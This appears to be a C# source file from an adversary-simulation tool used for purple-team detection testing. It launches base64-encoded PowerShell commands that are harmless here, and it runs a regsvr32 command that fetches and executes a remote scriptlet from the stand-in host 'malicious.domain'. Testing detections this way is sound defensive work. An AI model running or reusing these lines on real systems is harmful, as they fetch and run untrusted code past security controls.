using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class Execution
    {
        static public void ExecutePowershell(string log)
        {
            //ExecutionHelper.StartProcess("", "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAbgBvAHQAZQBwAGEAZAA=");
            //ExecutionHelper.StartProcess("", "powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==", log);

            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.TimestampInfo(String.Format("Starting T1086 Simulation on {0}", Environment.MachineName));
            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
            ExecutionHelper.StartProcess2("", "powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==", logger);
        }

        static public void ExecuteRegsvr32(string log)
        {
            ExecutionHelper.StartProcess("", "regsvr32.exe /u /n /s /i:http://malicious.domain:8080/payload.sct scrobj.dll", log);
        }

    }
}
